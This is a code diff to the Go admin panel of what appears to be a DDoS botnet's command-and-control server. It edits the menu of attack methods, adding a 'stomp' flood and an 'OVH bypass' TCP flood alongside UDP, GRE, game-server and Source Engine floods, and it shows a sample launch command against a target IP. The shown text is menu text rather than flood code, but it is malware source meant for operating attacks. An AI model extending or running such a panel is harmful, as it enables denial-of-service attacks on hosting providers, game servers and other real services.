@@ -485,10 +485,11 @@ func Admin(conn net.Conn) {
 				{"tcpsocket", ansiCommands + "tcp flood for high connections per seconds" + ansiReset},
 				{"tcpstream", ansiCommands + "tcp custom flood for bypassing." + ansiReset},
 				{"stdhex", ansiCommands + "udp flood with random hex." + ansiReset},
+				{"stomp", ansiCommands + "stomp flood." + ansiReset},
 				{"vseflood", ansiCommands + "value source engine flood." + ansiReset},
 				{"greip", ansiCommands + "gre ip flood." + ansiReset},
 				{"tcpwra", ansiCommands + "tcp custom flood for games." + ansiReset},
-				{"httpflood", ansiCommands + "HTTP raw flood." + ansiReset},
+				{"ovh", ansiCommands + "tcp flood optimized for OVH bypass." + ansiReset},
 				{"", ""},
 				{"syntax", ansiCommands + ".stdhex 1.1.1.1 60 dport=80" + ansiReset},
 			}
